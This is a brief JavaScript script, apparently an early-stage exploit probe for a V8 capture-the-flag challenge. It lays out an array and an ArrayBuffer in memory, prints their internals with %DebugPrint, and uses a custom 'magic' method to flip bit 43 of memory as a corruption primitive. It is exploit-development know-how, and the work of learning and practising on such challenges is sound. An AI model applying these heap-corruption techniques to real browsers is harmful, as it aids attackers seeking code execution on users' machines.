const N=73;
let arr=[1.1,2.2];
for(let i=0;i<N;i++) arr['p'+i]=i;
console.log('before arr');
%DebugPrint(arr);
let ab=new ArrayBuffer(0x80);
console.log('target buffer');
%DebugPrint(ab);
let len=arr.length;
arr.magic(len, 32+11); // flip bit 43
console.log('after arr');
%DebugPrint(arr);
